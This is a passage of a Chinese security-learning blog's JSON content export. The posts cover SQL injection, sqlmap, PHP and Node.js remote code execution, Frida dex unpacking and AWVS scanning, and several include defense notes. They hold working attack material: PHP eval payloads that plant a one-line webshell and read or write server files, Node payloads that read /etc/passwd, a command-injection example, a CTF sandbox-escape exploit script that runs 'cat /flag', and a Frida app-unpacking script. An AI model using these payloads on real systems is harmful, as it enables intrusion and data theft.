解决办法统一数据库，web应用的字符集，避免解析产生差异。或者使用mysql_real_escape_string和mysql_set_charset，对数据进行正确的转义。","categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"web安全之SqlMap","slug":"SqlMap源码解析","date":"2020-12-14T08:01:51.000Z","updated":"2021-07-03T09:22:42.926Z","comments":true,"path":"2020/12/14/SqlMap源码解析/","link":"","permalink":"http://yejuns.github.io/2020/12/14/SqlMap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/","excerpt":"","text":"SqlMap源码解析源码结构首先看一下目录结构，我们将文档类的文件排除掉，只看系统类： 目录 说明 data/ 数据库注入检测载荷、用户自定义攻击载荷、字典、shell命令、数据库触发顺序等 extra/ 一些额外功能，例如发出声响（beep）、运行cmd、安全执行、shellcode等 lib/ 包含了sqlmap的多种连接库，如五种注入类型请求的参数、提权操作等。 plugins/ 数据库信息和数据库通用事项 tamper/ 绕过脚本 thirdparty/ sqlmap使用的第三方的插件。 sqlmap.conf sqlmap的配置文件，如各种默认参数（默认是没有设置参数、可设置默认参数进行批量或者自动化检测） sqlmap.py sqlmap主程序文件 sqlmapapi.py sqlmap的api文件，可以将sqlmap集成到其他平台上","categories":[],"tags":[{"name":"SqlMap","slug":"SqlMap","permalink":"http://yejuns.github.io/tags/SqlMap/"}]},{"title":"web安全之SQL注入-报错注入","slug":"web安全之SQL注入-报错注入","date":"2020-12-12T08:01:51.000Z","updated":"2021-07-05T00:49:09.497Z","comments":true,"path":"2020/12/12/web安全之SQL注入-报错注入/","link":"","permalink":"http://yejuns.github.io/2020/12/12/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","excerpt":"","text":"报错注入（Error based Injection）一种SQL注入的类型，用于使SQL 语句报错的语法，用于注入结果无回显但错误信息有输出的情况。返回的错误信息即是攻击者需要的信息。 MySQL报错注入主要分为以下几类 BigInt 等数据类型溢出； Xpath 语法错误； count() + rand() + group_by() 导致重复； 空间数据类型函数错误。 会导致MySQL报错的函数 floor 函数； extractvalue 函数；（最多32字符） updatexml 函数； exp() 函数； 常用构造注入方法使用union语句，select 1,2 union select 1,2","categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"web安全之php代码注入","slug":"web安全之RCE-php代码注入","date":"2020-11-11T13:01:51.000Z","updated":"2021-07-03T09:23:12.366Z","comments":true,"path":"2020/11/11/web安全之RCE-php代码注入/","link":"","permalink":"http://yejuns.github.io/2020/11/11/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE-php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/","excerpt":"","text":"PHP代码注入代码执行（注入）类似SQL注入漏洞，SQL注入是将SQL 语句注入到数据库中执行，而代码执行则是可以把代码注入到应用中最终由服务器运行它。这样的漏洞如果没有特殊的过滤，相当于直接有一个Web 后门的存在。 存在的原因 程序中含有可以执行PHP 代码的函数或者语言结构 传入第一点中的参数，客户端可控，直接修改或者影响 相关函数和语句 eval() 测试代码如下 1234567&lt;?phpif(isset($_REQUEST[&#x27;code&#x27;]))&#123; @$str=$_REQUEST[&#x27;code&#x27;]; eval($str);&#125;?&gt; 提交变量?code=phpinfo();或者?code=${phpinfo()};或者?code=1;phpinfo(); assert() assert() 同样会作为PHP 代码执行 其他的跟eval()类似 preg_replace() preg_replace() 函数作用是对字符串进行正则处理, preg_replace(mixed $pattern,mixed $replacement,mixed $subject[,int limit = -1[,int &amp;$count]]) 搜索$subject 中匹配$pattern 的部分，以$replacement 进行替换，而$pattern处，及第一个参数存在e 修饰时，$replacement 的值会被当成PHP 代码来执行 call_user_func() call_user_func() 等函数都有调用其他函数的功能，其中一个参数作为要调用的函数名，那如果这个传入的函数名可控，那就可以调用以外的函数来执行我们想要的代码，也就是存在任意代码执行漏洞 1234567 &lt;?php if(isset($_GET[&#x27;fun&#x27;]))&#123; $fun=$_GET[&#x27;fun&#x27;]; $para=$_GET[&#x27;para&#x27;]; call_user_func($fun,$para); &#125;?&gt; 提交参数?fun=assert&amp;amp;para=phpinfo() 动态函数$a($b) 由于PHP 的特性原因，PHP 的函数支持直接由拼接的方式调用，这导致PHP 再安全上的控制又加大了难度。不少知名程序也用到了动态函数的写法，这种写法跟使用call_user_func() 的初衷一样，用来更加方便的调用函数，但是一旦过滤不严格就会造成代码执行漏洞 1234567&lt;?phpif(isset($_GET[&#x27;a&#x27;]))&#123; $a=$_GET[&#x27;a&#x27;]; $b=$_GET[&#x27;b&#x27;]; $a($b);&#125;?&gt; 提交参数?a=assert$b=phpinfo() 漏洞利用 直接获取shell 提交参数[?code=@eval($_REQUEST[1])],即可构成一句话木马，密码为[1]。可以使用菜刀连接 获取当前文件的绝对路径 __FILE__ 是PHP 预定义常量，其含义为当前文件的路径。提交代码?code=print(__FILE__); 读文件 可以利用file_get_contents() 函数读取服务器任意文件，前提是知道文件的绝对路径(也可是相对路径)和读取权限。比如，?code=var_dump(file_get_contents(&#39;c:\\windows\\system32\\drivers\\etc\\hosts&#39;)); 写文件 可以利用file_put_contents() 函数写入文件，前提是知道可写文件目录,比如 ?code=var_dump(file_put_contents($_POST[1],$_POST[2])); 同时需要通过post方式提交参数1=shel.php&amp;2=&lt;?php phpinfo()?&gt; 防御方法 尽量不要使用eval(不是函数，是语言结构) 等函数 如果使用的话一定要进行严格的过滤 preg_replace 放弃使用/e 修饰符 修改配置文件 disable_functions=assert","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Android逆向第六课 - frida （下）","slug":"Android逆向第六课","date":"2020-11-11T11:01:51.000Z","updated":"2021-07-31T15:20:29.476Z","comments":true,"path":"2020/11/11/Android逆向第六课/","link":"","permalink":"http://yejuns.github.io/2020/11/11/Android%E9%80%86%E5%90%91%E7%AC%AC%E5%85%AD%E8%AF%BE/","excerpt":"","text":"如何分析请求中的token ? 抓包分析，了解头信息的组成 分析头信息，拆解哪些头信息可以直接组装（比如 app-version，device-ID） 分析不能组装的数据的格式。（token：df21awdee0dc9cdf2333211WWWEER ） 反编译APP（先脱壳） 通过关键字 或者 其他手段定位到token加密的地方 分析出是如何加密的。 借助frida，我们可以简化上面的流程 （因为无论token如何变化，都是要调用一种加密算法（md5 base64 rsa sha）来对源token进行处理） 直接hook常见的加密类，然后在加密的方法里面做打印，得到源 token 在加密类中打印调用栈，找到加密的方法 1234// 打印调用堆栈function printstack()&#123; send(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Exception&quot;).$new()));&#125; frida 脱壳脱壳原理源dex文件最终会加载进内存，因此只要Hook加载Dex的函数，把Dex从内存中dump出来。而最为关键的方法就是 OpenMemory() 方法。 导出 Android 系统的 /system/lib/libart.so 到本地。然后使用 IDA 查看 OpenMemory 对应的签名函数名（android 9 和 android 7对函数名的命名会不一致） 获取 dex 文件在内存中的起始位置； 根据dex文件格式，因为从起始位置开始的第32个字节是该dex文件的大小，所以根据起始位置和大小，就可以 dump 整个 dex 文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#-*- coding:utf-8 -*-# coding=utf-8import fridaimport syspackage = &quot;com.xtuone.android.syllabus&quot;def on_message(message, data): if message[&#x27;type&#x27;] == &#x27;send&#x27;: print(&quot;[*] &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;])) else: print(message)open_memory_9 = &quot;_ZN3art13DexFileLoader10OpenCommonEPKhjS2_jRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPKNS_10OatDexFileEbbPS9_NS3_10unique_ptrINS_16DexFileContainerENS3_14default_deleteISH_EEEEPNS0_12VerifyResultE&quot;open_memory_7 = &quot;_ZN3art7DexFile10OpenMemoryEPKhjRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_&quot;src = &quot;&quot;&quot;var openMemory_address = Module.findExportByName(&quot;libart.so&quot;, &quot;_ZN3art7DexFile10OpenMemoryEPKhjRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_&quot;);send(&#x27;openMemory address:&#x27;+openMemory_address)Interceptor.attach(openMemory_address, &#123; onEnter: function (args) &#123; //dex文件的起始位置 var dex_begin_address = args[1] //dex文件的前8个字节是magic字段 看dex的文件格式说明 //打印magic（会显示 &quot;dex 035&quot;） 三个字符 可以验证是否为dex文件 console.log(&quot;magic : &quot; + Memory.readUtf8String(dex_begin_address)) //把地址转换成整型 再加32 //因为dex文件的第32个字节处存放的是 dex文件的大小 var address = parseInt(dex_begin_address, 16) + 0x20 //把address地址指向的内存值读出来 该值就是dex的文件大小 //ptr(address)转换的原因是 frida只接受 NativePointer类型指针 var dex_size = Memory.readInt(ptr(address)) console.log(&quot;dex_size :&quot; + dex_size) //frida写文件 把内存中的数据 写到本地 var timestamp = new Date().getTime(); var file = new File(&quot;/data/data/%s/&quot; + timestamp + &quot;.dex&quot;, &quot;wb&quot;) //Memory.readByteArray(begin, length) //把内存里的数据读出来，从begin开始读，取length长度 file.write(Memory.readByteArray(dex_begin_address, dex_size)) file.flush() file.close() send(&quot;dex begin address:&quot;+parseInt(dex_begin_address,16)) send(&quot;dex file size:&quot;+dex_size) &#125;, onLeave: function (retval) &#123; if (retval.toInt32() &gt; 0) &#123; &#125; &#125;&#125;);&quot;&quot;&quot;%(package)print(&quot;dex 导出目录为: /data/data/%s&quot;%(package))device = frida.get_usb_device(-1)pid = device.spawn(package)session = device.attach(pid)script = session.create_script(src)script.on(&quot;message&quot; , on_message)script.load()device.resume(pid)sys.stdin.read() 参考文献 https://tech.youzan.com/qian-tan-android-dexwen-jian/","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"AWVS安装、使用教程","slug":"AWVS使用","date":"2020-11-01T06:01:51.000Z","updated":"2021-07-19T01:31:47.349Z","comments":true,"path":"2020/11/01/AWVS使用/","link":"","permalink":"http://yejuns.github.io/2020/11/01/AWVS%E4%BD%BF%E7%94%A8/","excerpt":"","text":"AWVS是一款 Web 漏洞扫描工具，通过网络爬虫测试网站安全，检测流行的 Web 应用攻击，如跨站脚本、sql 注入等。 下载和安装下载和安装非常简单，链接在这里 AWVS使用windows中常用的一些命令1234567# 关闭服务Stop-Service -DisplayName &#x27;Acunetix&#x27;Stop-Service -DisplayName &#x27;Acunetix Database&#x27;# 启动服务Start-Service -DisplayName &#x27;Acunetix&#x27;Start-Service -DisplayName &#x27;Acunetix Database&#x27; 主要功能模块 Blind SQL injector:盲注工具 HTTP Editor：HTTP协议数据包编辑器 WebScanner：Web安全漏洞扫描（核心功能） Site Crawler：遍历站点目录结构（爬虫功能） HTTP Sniffer：HTTP协议嗅探器 HTTP Fuzzer：模糊测试工具 Authentication Tester: Web认证破解工具 Target Finder：端口扫描 Subdomain Scanner：子域名扫描器 开始扫描想要扫描某一个网站就很简单了，直接运行AWVS，然后在web页面上添加我们想要扫描的站点就可以。 添加成功后，点击scanner，即可开始扫描。扫描类型是 AWVS 为扫描特定类别的漏洞（例如跨站点脚本，SQL 注入等）执行的检查的逻辑分组, 主要类似有 完全扫描 - 使用 “完全扫描” 配置文件启动扫描，此扫描会进行所有可用的检查 高风险漏洞 - 仅检查最危险的 Web 漏洞 跨站点脚本漏洞 - 跨站点脚本扫描配置文件仅检查跨站点脚本漏洞 SQL 注入漏洞 - SQL 注入扫描配置文件仅检查 SQL 注入漏洞 弱密码 - 弱密码扫描配置文件将标识接受用户名和密码的表单，并将攻击这些表单 Crawl Only-Crawl Only 扫描仅对站点进行爬网并构建站点的结构，不运行任何漏洞检查 一段时间后，扫描结果会显示在首页上（扫描有风险，请在扫描之前做好上报工作）。 查看扫描结果扫描完成后，AWVS会给注册邮箱发送一封邮件，其中包含结果摘要以及一个链接，可直接访问扫描结果。扫描结果显示扫描的开始和结束日期，扫描的持续时间以及在扫描过程中已识别的所有警报。在网络扫描期间，当扫描检测到并使用 AWVS 时，活动面板将显示一条消息。 扫描结果包括 4 个部分 扫描统计信息 – 概述扫描检测到的目标，以及有关扫描的信息，例如扫描持续时间，平均响应时间和扫描的文件数。 漏洞 – 检测到的漏洞列表-按严重性排序 站点结构 – 可以使用站点结构来确保 AWVS 覆盖了所有站点，并确定了影响扫描站点的特定文件或文件夹的漏洞。单击文件夹图标以展开站点结构树 事件 – 与扫描相关的事件列表。这将显示扫描开始和结束的时间，以及在扫描过程中是否遇到任何错误","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"hexo命令和theme pure的使用","slug":"hexo设置","date":"2020-10-31T14:01:51.000Z","updated":"2021-07-09T12:09:44.742Z","comments":true,"path":"2020/10/31/hexo设置/","link":"","permalink":"http://yejuns.github.io/2020/10/31/hexo%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"建站 hexo init &lt; folder &gt; cd &lt; folder &gt; npm install 最后会生成这样的项目，其结构如下 123456789.├── _config.yml 网站的配置信息├── package.json 应用程序的信息├── scaffolds 模版文件夹├── source 资源文件夹是存放用户资源的地方| ├── _drafts| └── _posts└── themes 主题文件夹 常用的命令 hexo init [folder] #初始化 hexo new [layout] &lt;title&gt; hexo generate # hexo -g hexo server #Hexo 会监视文件变动并自动更新，除修改站点配置文件外,无须重启服务器,直接刷新网页即可生效 hexo publish [layout] &lt; filename &gt; hexo server –port –static –log hexo deploy hexo clean hexo list &lt;list&gt; Pure主题pure官方文档使用pure主题1、使用git下载theme，然后将相关代码复制到theme目录下的pure文件夹中 git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 2、修改hexo目录下的 _config.yml 文件，修改其中的 theme：pure 3、安装相关npm插件（需要进入hexo目录下，输入相关代码） npm install hexo-wordcount –save npm install hexo-generator-json-content –save npm install hexo-generator-feed –save npm install hexo-generator-sitemap –save npm install hexo-generator-baidu-sitemap –save 4、相关博客 常见问题1、如何在hexo中控制图片的大小 使用img标签1&lt;img src=&quot;./xxx.png&quot; width = &quot;300&quot; height = &quot;200&quot; alt=&quot;图片名称&quot; align=center /&gt; 如果需要居中的话只要在外面包围div标签即可123&lt;div align=&quot;center&quot;&gt; ...&lt;/div&gt;","categories":[],"tags":[{"name":"hexo使用","slug":"hexo使用","permalink":"http://yejuns.github.io/tags/hexo%E4%BD%BF%E7%94%A8/"}]},{"title":"web安全之RCE","slug":"web安全之RCE ","date":"2020-10-21T08:01:51.000Z","updated":"2021-07-28T03:54:48.191Z","comments":true,"path":"2020/10/21/web安全之RCE /","link":"","permalink":"http://yejuns.github.io/2020/10/21/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE%20/","excerpt":"","text":"RCE原理RCE (远程代码执行) 漏洞分为两种： 代码执行和命令执行 代码执行:执行的是脚本代码,脚本能执行的函数决定了危害程度（eval函数里必须是一个符合php语法的语句） 命令执行: 执行的是系统命令,能执行的系统命令决定了危害程度（system是命令执行） RCE 漏洞基本是产生在网站的查询接口或其他需要调用执行系统命令的函数的服务中 目标站点拥有一个查询服务的接口,如果调用了执行代码或命令的函数,就有可能存在RCE漏洞;反之，一个静态博客，没有任何接口和其他服务，基本上就不会存在RCE漏洞 RCE 漏洞利用 白盒测试： 代码审计 黑盒测试： 漏扫工具扫描，公开漏洞，手工根据参数值和功能点进行判定（比如 参数值有 ?id=echo 123) 系统命令执行漏洞利用以系统命令执行漏洞 为例,页面源码如下 123&lt;?phpecho system(&quot;ping -n 2 &quot; . $_GET[&#x27;ip&#x27;]);?&gt; 当访问 http://test.com/rce.php?ip=127.0.0.1时,程序会执行 ping 127.0.0.1,然后将结果返回到页面上 由于参数ip的值 127.0.0.1 是可控的;如果将值修改为 127.0.0.1 | whoami 再次访问，我们就可以得到当前用户名 代码执行漏洞利用这里以js的代码为例,可以看到直接eval了input的数据,所以存在RCE。 1234567var express = require(&#x27;express&#x27;);var app = express();app.get(&#x27;/&#x27;,function(req,res)&#123; var resp=eval(&quot;(&quot;+req.query.input+&quot;)&quot;); res.send(&#x27;Output&lt;/br&gt;&#x27;+resp);&#125;);app.listen(8001); 漏洞利用 https://127.0.0.1/?input=10*10 https://127.0.0.1/?input=require(%27child_process%27).execSync(%27cat+/etc/passwd%27).toString() https://127.0.0.1/?input=res.end(require(%27fs%27).readFileSync(%27/etc/passwd%27).toString()) RCE漏洞防御方案 尽量不要使用代码&amp;命令执行相关函数。 客户端提交的数据都是不可信的,变量在执行命令函数之前一定要进行过滤再执行,或将函数执行的变量值写死,不允许修改 使用WAF等安全产品进行防御。 RCE相关函数php命令执行 system exec shell_exec passthru popen proc_popen 代码执行 eval assert","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"夜神模拟器安装Xposed","slug":"夜神模拟器安装xposed","date":"2020-10-11T11:01:51.000Z","updated":"2021-07-28T05:23:43.742Z","comments":true,"path":"2020/10/11/夜神模拟器安装xposed/","link":"","permalink":"http://yejuns.github.io/2020/10/11/%E5%A4%9C%E7%A5%9E%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%AE%89%E8%A3%85xposed/","excerpt":"","text":"1. 解决方案先安装神盾全版本秒安装xp框架.apk,在这个 app 里安装xposed框架，安装成功后卸载 神盾 , 重新安装 xposed-installer，xposed 安装成功如图所示 工具下载地址: https://pan.baidu.com/s/1aFFYH2M_EXaCHqIh4yGUxA 提取码：ahxw 安装神盾全版本秒安装xp框架.apk后, 在当前界面上点击安装/更新,然后点击install即可。 (最新发现，使用夜神模拟器 6.6.1.2以上版本，会在你安装Xposed框架时自动提示使用其他安装工具协助安装) 2. 解决思路首先我注意到 app 第一次运行时有一个 toast，表示网络请求失败， 于是我尝试开启全局代理，发现仍然是这个错误，那就说明不是网络的问题了。于是复制了这个链接地址，把请求的文件下载到本地，打开一看原来是一个full.xml文件，里面的内容是一大堆下载的地址。 12345678910add Auto-save and auto reload the theme of search results until the refresh button.&amp;lt;/p&amp;gt;&lt;/changelog&gt; &lt;/version&gt; &lt;version&gt; &lt;name&gt;v6.6&lt;/name&gt; &lt;code&gt;6&lt;/code&gt; &lt;reltype&gt;stable&lt;/reltype&gt; &lt;download&gt;https://dl-xda.xposed.info/modules/com.haiduongbk.hkthememanager_v6_436831.apk&lt;/download&gt; &lt;md5sum&gt;436831e5ad8a229f8ae6b077fc1e74f7&lt;/md5sum&gt; &lt;size&gt;1154133&lt;/size&gt; &lt;changelog html=&quot;true&quot;&gt;&amp;lt;p&amp;gt;- add auto fix for HK Mod theme&amp;lt;br /&amp;gt; 看不懂没关系，这种apk一般都是开源的，于是我去github上找到了这个项目的地址，把代码clone了下来，然后用 Android studio 打开，全局查询这个 url，可以找到其所在的位置, 在 FrameworkZips.java。看一下整个 class 的代码，功能是下载一个zip文件，然后解析这个文件并返回。于是我把这个文件上传到自己的服务器，然后在源码里替换对应的 url 。 12// private static final String ONLINE_URL = &quot;http://121.43.112.70:8888/framework.json&quot;;private static final String ONLINE_URL = &quot;http://dl-xda.xposed.info/framework.json&quot;; 用 AS 重新运行，可以发现原有的 toast 消失了，但是仍然显示没有成功安装 xposed，但是主页面已经出现了 安装/更新的按钮，我们点击安装，会发现一直显示 下载等待中， 那就必然是网络的问题。这时候有两种解决办法： 找到下载zip包的地址，先将要下载的zip文件移动到自己的文件服务器，然后替换原url（相关的url都在full.xml）， 将要下载的文件下载到本地，然后一起打包到apk中。（需要修改源码）","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"web安全之nodeJs","slug":"web安全之nodejs","date":"2020-09-21T08:01:51.000Z","updated":"2021-07-04T08:15:28.143Z","comments":true,"path":"2020/09/21/web安全之nodejs/","link":"","permalink":"http://yejuns.github.io/2020/09/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bnodejs/","excerpt":"","text":"最近在学习nodeJs，发现一些有趣的地方，总结一下 原型链自己写了相关的博客，看这边 弱类型类似php，直接看例子理解吧 123456console.log(1==&#x27;1&#x27;); //trueconsole.log(2&gt;&#x27;3&#x27;); //falseconsole.log(&#x27;1&#x27;&lt;&#x27;2&#x27;); //trueconsole.log(111&gt;&#x27;3&#x27;); //trueconsole.log(&#x27;111&#x27;&gt;&#x27;3&#x27;); //falseconsole.log(&#x27;ads&#x27;&gt;1); //false 总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false。 1234567console.log([]==[]); //falseconsole.log([]&gt;[]); //falseconsole.log([]&lt;[]); //falseconsole.log([7,2]&gt;[5]); //trueconsole.log([100,2]&lt;&#x27;test&#x27;); //trueconsole.log([1,2]&lt;&#x27;2&#x27;); //trueconsole.log([11,16]&lt;&quot;10&quot;); //false 总结：空数组之间比较永远为false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较. 一些比较特别的相等 1234console.log(null==undefined) // 输出：trueconsole.log(null===undefined) // 输出：falseconsole.log(NaN==NaN) // 输出：falseconsole.log(NaN===NaN) // 输出：false 变量拼接 1234console.log(5+[6,6]); //56,3console.log(&quot;5&quot;+6); //56console.log(&quot;5&quot;+[6,6]); //56,6console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6 模块加载与命令执行在一些沙盒逃逸时我们通常是找到一个可以执行任意命令的payload，若是在ctf比赛中，我们需要getflag时通常是需要想尽办法加载模块来达成特殊要求。通过child_process模块来加载模块，获得exec，execfile，execSync。（child_process模块用来启动一个新的进程，一般用在处理一些定时执行的操作） 通过require加载模块如下：require(&#39;child_process&#39;).exec(&#39;calc&#39;); 通过global对象加载模块global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;); 有些情况下可以直接用require，如eval。 1234eval(&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;);setInterval(require(&#x27;child_process&#x27;).exec,1000,&quot;calc&quot;);setTimeout(require(&#x27;child_process&#x27;).exec,1000,&quot;calc&quot;);Function(&quot;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;)(); 大小写特性ES6模板字符串可以使用反引号替代括号执行函数，如: 1alert`test!!` 可以用反引号替代单引号双引号，可以在反引号内插入变量，如： 12var fruit = &quot;apple&quot;;console.log`i like $&#123;fruit&#125; very much`; 模板字符串是将我们的字符串作为参数传入函数中，而该参数是一个数组，该数组会在遇到${}时将字符串进行分割，具体为下： 123456[&quot;i like &quot;, &quot; very much&quot;, raw: Array(2)]0: &quot;i like &quot;1: &quot; very much&quot;length: 2raw: (2) [&quot;i like &quot;, &quot; very much&quot;]__proto__: Array(0) 实战这道题取自NPUCTF的验证码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const cookieSession = require(&#x27;cookie-session&#x27;);const fs = require(&#x27;fs&#x27;);const crypto = require(&#x27;crypto&#x27;);const keys = require(&#x27;./key.js&#x27;).keys;function md5(s) &#123; return crypto.createHash(&#x27;md5&#x27;) .update(s) .digest(&#x27;hex&#x27;);&#125;function saferEval(str) &#123; if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123; return null; &#125; return eval(str);&#125; // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个const template = fs.readFileSync(&#x27;./index.html&#x27;).toString();function render(results) &#123; return template.replace(&#x27;&#123;&#123;results&#125;&#125;&#x27;, results.join(&#x27;&lt;br/&gt;&#x27;));&#125;const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123; name: &#x27;PHPSESSION&#x27;, // 2020.3/WORKER2 嘿嘿， keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post(&#x27;/&#x27;, function (req, res) &#123; let result = &#x27;&#x27;; const results = req.session.results || []; const &#123; e, first, second &#125; = req.body; if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) &#123; if (req.body.e) &#123; try &#123; result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;; &#125; catch (e) &#123; console.log(e); result = &#x27;Wrong Wrong Wrong!!!&#x27;; &#125; results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`); &#125; &#125; else &#123; results.unshift(&#x27;Not verified!&#x27;); &#125; if (results.length &gt; 13) &#123; results.pop(); &#125; req.session.results = results; res.send(render(req.session.results));&#125;);app.get(&#x27;/source&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/javascript;charset=utf-8&#x27;); res.send(fs.readFileSync(&#x27;./index.js&#x27;));&#125;);app.get(&#x27;/&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/html;charset=utf-8&#x27;); req.session.admin = req.session.admin || 0; res.send(render(req.session.results = req.session.results || []))&#125;);app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123; console.log(&#x27;Start listening&#x27;)&#125;); 首先看到saferEval函数，我们看到只要绕过正则之后就可以利用在代码执行处所说的eval来执行代码；在此之前看看调用了saferEval的地方，这里要绕过就需要利用到前面说的弱类型了 1if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp;md5(first+keys[0]) === md5(second+keys[0])) first和second都是我们可控的，这里要我们first和second不相等但长度又需要相等，同时还要在最后加上key之后进行md5要相等，要符合一系列条件较难，然而弱类型帮了一把。 md5处使用了变量的拼接，因此我们可以利用类似&#39;a&#39;+key[0]==[&#39;a&#39;]+key[0]进行绕过，而且关键在于first和second的比较使用了!===。这也给绕过提供了帮助。 抓包时候会发现是默认请求类型是x-www-form-urlencoded，无法传输数组，但因为这里使用了body-parser模块内的json，因此可以改下头application/json。 123456789101112#-*- coding:utf-8 -*-#__author__: HhhMimport requestsimport jsonprint(&quot;Start the program:&quot;)url = &quot;http://xxx/&quot;headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;data = json.dumps(&#123;&#x27;e&#x27;: &quot;1+1&quot;, &quot;first&quot;: [1], &quot;second&quot;: &quot;1&quot;&#125;)r = requests.post(url, headers=headers, data=data)print(r.text) 输出为2，证明前面成功绕过了，接下来考虑saferEval，看看正则： 1str.replace(&#x2F;(?:Math(?:\\.\\w+)?)|[()+\\-*&#x2F;&amp;|^%&lt;&gt;&#x3D;,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| &#x2F;g, &#39;&#39;) 我们需要让我们的正则符合他的要求，利用前两个正则我们可以构造出如：(Math)，Math.xxx(xxx) 也支持使用arrow function（箭头函数），我们可以使用箭头函数配合Math通过原型获取到Function，使用我上面提到的Function，通过global一路调出来exec执行任意命令。 1Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.constructor) 这样虽然可以得到Function，但限于正则我们无法执行命令，这里绕过采用String.fromCharCode，String可以通过变量拼接拼接出一个字符串，再调用constructor获取到String对象。因此exp如下: 12345678910111213141516171819#-*- coding:utf-8 -*-#__author__: HhhMimport requestsimport jsonimport redef payload(): s = &quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot; return &#x27;,&#x27;.join([str(ord(i)) for i in s])a = payload()print(&quot;Start the program:&quot;)url = &quot;http://xxx/&quot;headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;e = &quot;(Math=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;0&#125;))()))(Math+1)&quot;.format(a)data = json.dumps(&#123;&#x27;e&#x27;: e, &quot;first&quot;: [1], &quot;second&quot;: &quot;1&quot;&#125;)r = requests.post(url, headers=headers, data=data)print(r.text)","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"SqlMap使用","slug":"SqlMap使用","date":"2020-08-31T08:01:51.000Z","updated":"2021-07-19T02:39:59.740Z","comments":true,"path":"2020/08/31/SqlMap使用/","link":"","permalink":"http://yejuns.github.io/2020/08/31/SqlMap%E4%BD%BF%E7%94%A8/","excerpt":"","text":"SqlMapSqlMap是一个开源的测试渗透工具，可以用来自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。 简单示例123456789101112131415161718sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot;#基本格式，默认使用level 1，检测全部数据库类型sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; -f --banner --dbs --users# -f表示获取对应的指纹信息（fingerPrint），--banner表示数据库的banner信息，--dbs获取对应的数据库信息，--users获取用户信息sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3#指定数据库类型是mysql，检测级别为3（共5级，级别越高，检测越全面）sqlmap -u 